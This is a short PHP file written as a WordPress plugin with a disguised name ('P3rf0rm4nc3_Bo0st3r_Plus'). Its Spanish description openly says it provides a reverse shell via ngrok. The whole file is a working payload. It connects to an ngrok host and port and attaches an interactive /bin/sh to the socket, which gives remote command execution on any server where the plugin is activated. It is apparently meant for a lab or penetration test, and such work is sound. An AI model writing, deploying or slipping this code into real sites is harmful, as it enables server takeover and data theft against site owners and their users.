<?php

/*
Plugin Name: P3rf0rm4nc3_Bo0st3r_Plus
Description: Un plugin que te da una reverse shell a través de ngrok.
Version: 1.0
Author: Shur3
*/

set_time_limit(0);
$ip = '0.tcp.sa.ngrok.io';   // La IP de ngrok
$port = 13337;           	// El puerto de ngrok

$sock = fsockopen($ip, $port);
if (!$sock) {
	die("No se pudo conectar al host $ip en el puerto $port");
}

$proc = proc_open('/bin/sh -i', array(
	0 => $sock,
	1 => $sock,
	2 => $sock
), $pipes);

if (!is_resource($proc)) {
	die("No se pudo iniciar el shell interactivo");
}

proc_close($proc);

?>
